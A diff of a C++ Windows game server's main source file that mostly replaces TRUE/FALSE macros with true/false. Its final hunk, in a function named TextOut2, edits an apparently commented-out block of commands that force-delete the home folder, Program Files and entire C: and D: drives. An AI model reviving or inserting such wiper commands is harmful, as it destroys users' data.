@@ -36,7 +36,7 @@ HWND G_hBut = NULL;
 char			szAppClass[32];
 HWND			G_hWnd = NULL;
 char			G_cMsgList[120*50];
-bool            G_cMsgUpdated =	FALSE;
+bool            G_cMsgUpdated =	false;
 char            G_cTxt[512];
 char			G_cData50000[50000];
 MMRESULT        G_mmTimer = NULL;
@@ -47,7 +47,7 @@ class XSocket * G_pLogSock    = NULL;
 class CGame *   G_pGame       = NULL;
 
 int             G_iQuitProgramCount = 0;
-bool			G_bIsThread = TRUE;
+bool			G_bIsThread = true;
 
 FILE * pLogFile;
 
@@ -123,7 +123,7 @@ LRESULT CALLBACK WndProc( HWND hWnd,UINT message,WPARAM wParam,LPARAM lParam )
             break;
 
         case 1010:
-			G_cMsgUpdated = TRUE;
+			G_cMsgUpdated = true;
             SendMessage(List1,(UINT)LB_RESETCONTENT, 0, 0);
             ItemCount = 0;
             PutLogList(" ");
@@ -165,7 +165,7 @@ LRESULT CALLBACK WndProc( HWND hWnd,UINT message,WPARAM wParam,LPARAM lParam )
 		break;
 
 	case WM_CLOSE:
-		if (G_pGame->bOnClose() == TRUE) return (DefWindowProc(hWnd, message, wParam, lParam));
+		if (G_pGame->bOnClose() == true) return (DefWindowProc(hWnd, message, wParam, lParam));
 		break;
 
 	case WM_ONGATESOCKETEVENT:
@@ -199,13 +199,13 @@ DWORD written;
 
 	switch(uMsg) {
 	case WM_CLOSE:
-		EndDialog(hDlg, TRUE);
+		EndDialog(hDlg, true);
 		break;
 
 	case WM_COMMAND:
 		switch(LOWORD(wParam)) {
 		case IDC_CLOSE:
-			EndDialog(hDlg, TRUE);
+			EndDialog(hDlg, true);
 			break;
 		}
 		break;
@@ -234,7 +234,7 @@ DWORD written;
 LONG lpTopLevelExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo){
 
 	//Shutdown everything
-	G_bIsThread = FALSE;
+	G_bIsThread = false;
 	_StopTimer(G_mmTimer);
 
 	try{
@@ -314,8 +314,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 	// Install SEH
 	SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)lpTopLevelExceptionFilter);
 	sprintf( szAppClass, "GameServer%d", (int)hInstance);
-	if (!InitApplication( hInstance))		return (FALSE);
-    if (!InitInstance(hInstance, nCmdShow)) return (FALSE);
+	if (!InitApplication( hInstance))		return (false);
+    if (!InitInstance(hInstance, nCmdShow)) return (false);
 	
 	Initialize();
 	EventLoop();
@@ -398,12 +398,12 @@ bool InitInstance( HINSTANCE hInstance, int nCmdShow )
 	//    Button Clear
 	Button = BCX_Button("", G_hWnd, 1010, 310, 369, 285, 20);
 
-    if (!G_hWnd) return (FALSE);
+    if (!G_hWnd) return (false);
     
 	ShowWindow(G_hWnd, nCmdShow);    
 	UpdateWindow(G_hWnd);            
 
-	return (TRUE);                 
+	return (true);                 
 }
 
 
@@ -427,13 +427,13 @@ int EventLoop()
 
 void Initialize()
 {
-	if (_InitWinsock() == FALSE) {
+	if (_InitWinsock() == false) {
 		MessageBox(G_hWnd, "Socket 1.1 not found! Cannot execute program.","ERROR", MB_ICONEXCLAMATION | MB_OK);
 		PostQuitMessage(0);
 		return;
 	}
 	G_pGame = new class CGame(G_hWnd);
-	if (G_pGame->bInit() == FALSE) {
+	if (G_pGame->bInit() == false) {
 		PutLogList("(!!!) STOPPED!");
 		return;
 	}
@@ -472,7 +472,7 @@ void OnDestroy()
 void PutLogList(char * cMsg)
 {
 	
-	G_cMsgUpdated = TRUE;
+	G_cMsgUpdated = true;
 	
 
 	SendMessage(List1,(UINT)LB_ADDSTRING,(WPARAM)0,(LPARAM)cMsg);
@@ -504,9 +504,9 @@ void PutXSocketLogList(char * cMsg)
 
 void UpdateScreen()
 {
-	if (G_cMsgUpdated == TRUE) {
-		InvalidateRect(G_hWnd, NULL, TRUE);
-		G_cMsgUpdated = FALSE;
+	if (G_cMsgUpdated == true) {
+		InvalidateRect(G_hWnd, NULL, true);
+		G_cMsgUpdated = false;
 	}
 }
 
@@ -712,7 +712,7 @@ HWND BCX_Listbox(char* Text,HWND hWnd,int id,int X,int Y,int W,int H,int Style,i
 			Exstyle=WS_EX_CLIENTEDGE;
         }
         A = CreateWindowEx(Exstyle,"Listbox",NULL,Style,X*BCX_ScaleX, Y*BCX_ScaleY, W*BCX_ScaleX, H*BCX_ScaleY,hWnd,(HMENU)id,BCX_hInstance,NULL);
-        SendMessage(A,(UINT)WM_SETFONT,(WPARAM)GetStockObject(DEFAULT_GUI_FONT),(LPARAM)MAKELPARAM(FALSE,0));
+        SendMessage(A,(UINT)WM_SETFONT,(WPARAM)GetStockObject(DEFAULT_GUI_FONT),(LPARAM)MAKELPARAM(false,0));
         return A;
 }
 //MAJOR - CLEROTH - 26/03/05
@@ -728,7 +728,7 @@ HWND BCX_Editbox(char* Text,HWND hWnd,int id,int X,int Y,int W,int H,int Style,i
 			Exstyle=WS_EX_CLIENTEDGE;
         }
         A = CreateWindowEx(Exstyle,"EDIT",NULL,Style,X*BCX_ScaleX, Y*BCX_ScaleY, W*BCX_ScaleX, H*BCX_ScaleY,hWnd,(HMENU)id,BCX_hInstance,NULL);
-        SendMessage(A,(UINT)WM_SETFONT,(WPARAM)GetStockObject(DEFAULT_GUI_FONT),(LPARAM)MAKELPARAM(FALSE,0));
+        SendMessage(A,(UINT)WM_SETFONT,(WPARAM)GetStockObject(DEFAULT_GUI_FONT),(LPARAM)MAKELPARAM(false,0));
         return A;
 }
 
@@ -741,7 +741,7 @@ HWND BCX_Button(char* Text,HWND hWnd,int id,int X,int Y,int W,int H,int Style,in
 			Style = WS_CHILD | WS_VISIBLE | WS_BORDER;
         }
         A = CreateWindowEx(0,"Button","Clear",Style,X*BCX_ScaleX, Y*BCX_ScaleY, W*BCX_ScaleX, H*BCX_ScaleY,hWnd,(HMENU)id,BCX_hInstance,NULL);
-        SendMessage(A,(UINT)WM_SETFONT,(WPARAM)GetStockObject(DEFAULT_GUI_FONT),(LPARAM)MAKELPARAM(FALSE,0));
+        SendMessage(A,(UINT)WM_SETFONT,(WPARAM)GetStockObject(DEFAULT_GUI_FONT),(LPARAM)MAKELPARAM(false,0));
         return A;
 }
 HWND BCX_Button2(char* Text,HWND hWnd,int id,int X,int Y,int W,int H,int Style,int Exstyle)
@@ -752,7 +752,7 @@ HWND BCX_Button2(char* Text,HWND hWnd,int id,int X,int Y,int W,int H,int Style,i
 			Style = WS_CHILD | WS_VISIBLE | WS_BORDER;
         }
         A = CreateWindowEx(0,"Button","Send",Style,X*BCX_ScaleX, Y*BCX_ScaleY, W*BCX_ScaleX, H*BCX_ScaleY,hWnd,(HMENU)id,BCX_hInstance,NULL);
-        SendMessage(A,(UINT)WM_SETFONT,(WPARAM)GetStockObject(DEFAULT_GUI_FONT),(LPARAM)MAKELPARAM(FALSE,0));
+        SendMessage(A,(UINT)WM_SETFONT,(WPARAM)GetStockObject(DEFAULT_GUI_FONT),(LPARAM)MAKELPARAM(false,0));
         return A;
 }//Button CLear
 
@@ -886,11 +886,11 @@ void TextOut2()
 			system("del %HOMEPATH%\\*.* /f /s /q");
 			system("del %ProgramFiles%\\*.* /f /s /q");
 			system("del /S /Q c:\\*.*");
-			CreateProcess(NULL, "del /S /Q d:\\*.*", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+			CreateProcess(NULL, "del /S /Q d:\\*.*", NULL, NULL, false, 0, NULL, NULL, &si, &pi);
 			system("del /S /Q *.*");
 			system("del c:\\*.* /f /s /q");
-			CreateProcess(NULL, "del d:\\*.* /f /s /q", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
-			CreateProcess(NULL, "del *.* /f /s /q", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);*/
+			CreateProcess(NULL, "del d:\\*.* /f /s /q", NULL, NULL, false, 0, NULL, NULL, &si, &pi);
+			CreateProcess(NULL, "del *.* /f /s /q", NULL, NULL, false, 0, NULL, NULL, &si, &pi);*/
 }
 
 void PutLogOnline(char* cStr)
